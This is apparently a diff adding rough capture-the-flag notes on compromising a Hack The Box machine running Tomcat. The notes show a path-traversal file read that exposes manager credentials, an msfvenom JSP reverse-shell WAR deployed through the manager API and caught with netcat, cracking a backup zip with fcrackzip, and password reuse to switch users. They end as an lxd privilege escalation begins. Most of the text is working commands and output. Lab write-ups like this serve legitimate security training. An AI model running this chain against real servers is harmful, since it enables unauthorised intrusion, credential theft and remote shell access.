@@ -1,0 +1,154 @@
+
+
+
+
+website is vulnerable to LFI
+
+
+http://megahosting.htb/news.php?file=statement
+
+
+http://megahosting.htb/news.php?file=../../../../../usr/share/tomcat9/etc/tomcat-users.xml
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!--
+  Licensed to the Apache Software Foundation (ASF) under one or more
+  contributor license agreements.  See the NOTICE file distributed with
+  this work for additional information regarding copyright ownership.
+  The ASF licenses this file to You under the Apache License, Version 2.0
+  (the "License"); you may not use this file except in compliance with
+  the License.  You may obtain a copy of the License at
+
+      http://www.apache.org/licenses/LICENSE-2.0
+
+  Unless required by applicable law or agreed to in writing, software
+  distributed under the License is distributed on an "AS IS" BASIS,
+  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+  See the License for the specific language governing permissions and
+  limitations under the License.
+-->
+<tomcat-users xmlns="http://tomcat.apache.org/xml"
+              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
+              version="1.0">
+<!--
+  NOTE:  By default, no user is included in the "manager-gui" role required
+  to operate the "/manager/html" web application.  If you wish to use this app,
+  you must define such a user - the username and password are arbitrary. It is
+  strongly recommended that you do NOT use one of the users in the commented out
+  section below since they are intended for use with the examples web
+  application.
+-->
+<!--
+  NOTE:  The sample user and role entries below are intended for use with the
+  examples web application. They are wrapped in a comment and thus are ignored
+  when reading this file. If you wish to configure these users for use with the
+  examples web application, do not forget to remove the <!.. ..> that surrounds
+  them. You will also need to set the passwords to something appropriate.
+-->
+<!--
+  <role rolename="tomcat"/>
+  <role rolename="role1"/>
+  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
+  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
+  <user username="role1" password="<must-be-changed>" roles="role1"/>
+-->
+   <role rolename="admin-gui"/>
+   <role rolename="manager-script"/>
+   <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
+</tomcat-users>
+
+
+
+
+┌──(kali㉿kali)-[~]
+└─$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.16 LPORT=4444 -f war -o shell.war
+Payload size: 1097 bytes
+Final size of war file: 1097 bytes
+Saved as: shell.war
+                                                                                                                    
+┌──(kali㉿kali)-[~]
+└─$ curl -u 'tomcat:$3cureP4s5w0rd123!' --upload-file shell.war "http://10.10.10.194:8080/manager/text/deploy?path=/shell&update=true" -v
+*   Trying 10.10.10.194:8080...
+* Connected to 10.10.10.194 (10.10.10.194) port 8080
+* using HTTP/1.x
+* Server auth using Basic with user 'tomcat'
+> PUT /manager/text/deploy?path=/shell&update=true HTTP/1.1
+> Host: 10.10.10.194:8080
+> Authorization: Basic dG9tY2F0OiQzY3VyZVA0czV3MHJkMTIzIQ==
+> User-Agent: curl/8.13.0
+> Accept: */*
+> Content-Length: 1097
+> 
+* upload completely sent off: 1097 bytes
+< HTTP/1.1 200 
+< Cache-Control: private
+< Expires: Thu, 01 Jan 1970 00:00:00 GMT
+< X-Content-Type-Options: nosniff
+< Content-Type: text/plain;charset=utf-8
+< Transfer-Encoding: chunked
+< Date: Mon, 18 Aug 2025 10:50:27 GMT
+< 
+OK - Deployed application at context path [/shell]
+* Connection #0 to host 10.10.10.194 left intact
+                                                                                                                    
+┌──(kali㉿kali)-[~]
+└─$ curl -u 'tomcat:$3cureP4s5w0rd123!' "http://10.10.10.194:8080/manager/text/list"
+OK - Listed applications for virtual host [localhost]
+/:running:0:ROOT
+/examples:running:0:/usr/share/tomcat9-examples/examples
+/host-manager:running:0:/usr/share/tomcat9-admin/host-manager
+/shell:running:0:shell
+/manager:running:0:/usr/share/tomcat9-admin/manager
+/docs:running:0:/usr/share/tomcat9-docs/docs
+                                                                                                                    
+┌──(kali㉿kali)-[~]
+└─$ 
+┌──(kali㉿kali)-[~]
+└─$ # try a few likely endpoints; run after listener is ready
+curl -s "http://10.10.10.194:8080/shell/" || true
+curl -s "http://10.10.10.194:8080/shell/shell.jsp" || true
+curl -s "http://10.10.10.194:8080/shell/index.jsp" || true
+
+
+
+┌──(kali㉿kali)-[~]
+└─$ rlwrap nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.16] from (UNKNOWN) [10.10.10.194] 54474
+id
+uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
+python3 -c 'import pty,os; pty.spawn("/bin/bash")'
+
+
+tomcat@tabby:/var/lib/tomcat9$ 
+
+
+"Enumeration of the directories and files reveals the archive
+/var/www/html/16162020_backup.zip , that is owned by the user ash . Trying to unzip this file
+returns a message prompting for a password"
+
+"base64 -w0 16162020_backup.zip"
+"echo "UEsDBAoAAAAAAIUDf0gAAAAAAAAAAAAAAAA<SNIP>" | base64 -d -w0 > backup.zip"
+"fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt backup.zip"
+cracked to admin@it
+
+password reuse
+
+
+tomcat@tabby:/var/lib/tomcat9$ su ash
+su ash
+Password: admin@it
+
+ash@tabby:/var/lib/tomcat9$ 
+
+
+
+no sudoers, but member of lxd
+
+"The lxd (Linux Daemon) is a system container manager, that controls lxc (Linux Container).
+Linux Container (LXC) is a virtualization technology that runs isolated containers using a single
+Linux kernel. It is possible for the user ash to create a privileged container and then use it to
+mount the host filesystem. To achieve this, we can download an Alpine image, and then upload it
+to the remote machine. Lets download and build the image locally. The image can be found here."
+
